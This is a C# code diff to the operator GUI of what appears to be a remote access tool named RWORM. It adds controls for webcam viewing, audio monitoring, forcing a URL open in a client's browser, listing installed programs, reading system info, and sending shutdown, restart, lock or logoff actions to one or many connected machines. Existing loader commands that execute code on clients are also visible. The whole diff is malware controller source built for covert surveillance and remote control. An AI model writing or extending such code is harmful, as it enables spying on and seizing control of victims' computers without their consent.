@@ -169,6 +169,17 @@ namespace RWORM.GUI.ViewModels
         public ICommand OpenNetMonitorCommand      { get; }
         public ICommand OpenAutorunManagerCommand  { get; }
         public ICommand OpenClipboardManagerCommand { get; }
+        public ICommand OpenWebcamCommand           { get; }
+        public ICommand OpenAudioCommand            { get; }
+        public ICommand OpenUrlCommand              { get; }
+        public ICommand OpenInstalledProgramsCommand{ get; }
+        public ICommand OpenSystemInfoCommand       { get; }
+        public ICommand PowerShutdownCommand        { get; }
+        public ICommand PowerRestartCommand         { get; }
+        public ICommand PowerLockCommand            { get; }
+        public ICommand PowerSleepCommand           { get; }
+        public ICommand PowerHibernateCommand       { get; }
+        public ICommand PowerLogoffCommand          { get; }
         public ICommand LoaderExecCommand          { get; }
         public ICommand LoaderExecFileCommand      { get; }
         public ICommand ClientCloseCommand         { get; }
@@ -239,6 +250,17 @@ namespace RWORM.GUI.ViewModels
             OpenNetMonitorCommand     = new RelayCommand(p => OpenNetMonitor(p as ClientModel));
             OpenAutorunManagerCommand = new RelayCommand(p => OpenAutorunManager(p as ClientModel));
             OpenClipboardManagerCommand = new RelayCommand(p => OpenClipboardManager(p as ClientModel));
+            OpenWebcamCommand           = new RelayCommand(p => OpenWebcam(p as ClientModel));
+            OpenAudioCommand            = new RelayCommand(p => OpenAudio(p as ClientModel));
+            OpenUrlCommand              = new RelayCommand(p => PromptOpenUrl(p as ClientModel));
+            OpenInstalledProgramsCommand= new RelayCommand(p => OpenInstalledPrograms(p as ClientModel));
+            OpenSystemInfoCommand       = new RelayCommand(p => OpenSystemInfo(p as ClientModel));
+            PowerShutdownCommand        = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "shutdown"));
+            PowerRestartCommand         = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "restart"));
+            PowerLockCommand            = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "lock"));
+            PowerSleepCommand           = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "sleep"));
+            PowerHibernateCommand       = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "hibernate"));
+            PowerLogoffCommand          = new RelayCommand(p => ConfirmPowerAction(p as ClientModel, "logoff"));
             LoaderExecCommand         = new RelayCommand(p => PromptLoaderExec(p as ClientModel));
             LoaderExecFileCommand     = new RelayCommand(p => PromptLoaderExecFile(p as ClientModel));
             ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel));
@@ -517,6 +539,77 @@ namespace RWORM.GUI.ViewModels
             var target = ResolveTargets(c).FirstOrDefault();
             if (target == null) return;
             new ClipboardManagerWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenWebcam(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new WebcamWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void OpenAudio(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new AudioMonitorWindow(_server, target.Guid, target.Hostname).Show();
+        }
+
+        private void PromptOpenUrl(ClientModel? c)
+        {
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
+            var url = InputDialog.Show("Target URL to open in default browser:", "Open URL", "https://");
+            if (string.IsNullOrWhiteSpace(url)) return;
+            foreach (var client in targets)
+            {
+                _server.OpenUrl(client.Guid, url);
+            }
+            StatusMessage = $"Open URL ({url}) sent to {targets.Count} client(s)";
+        }
+
+        private void OpenInstalledPrograms(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new InstalledProgramsWindow(_server, target.Guid).Show();
+        }
+
+        private void OpenSystemInfo(ClientModel? c)
+        {
+            var target = ResolveTargets(c).FirstOrDefault();
+            if (target == null) return;
+            new SystemInfoWindow(_server, target.Guid).Show();
+        }
+
+        private void ConfirmPowerAction(ClientModel? c, string action)
+        {
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
+            string desc = action switch
+            {
+                "shutdown" => "Shutdown",
+                "restart" => "Restart",
+                "lock" => "Lock workstation",
+                "sleep" => "Put into Sleep",
+                "hibernate" => "Put into Hibernate",
+                "logoff" => "Log off current user",
+                _ => action
+            };
+
+            string prompt = targets.Count == 1
+                ? $"{desc} on {targets[0].Hostname}?"
+                : $"{desc} on {targets.Count} selected clients?";
+
+            if (System.Windows.MessageBox.Show(prompt, $"PC - {desc}",
+                    System.Windows.MessageBoxButton.YesNo,
+                    System.Windows.MessageBoxImage.Warning) != System.Windows.MessageBoxResult.Yes) return;
+
+            foreach (var client in targets)
+            {
+                _server.SendPowerAction(client.Guid, action);
+            }
+            StatusMessage = $"Power action '{action}' dispatched to {targets.Count} client(s)";
         }
 
         // ── Client control ────────────────────────────────────────────────────
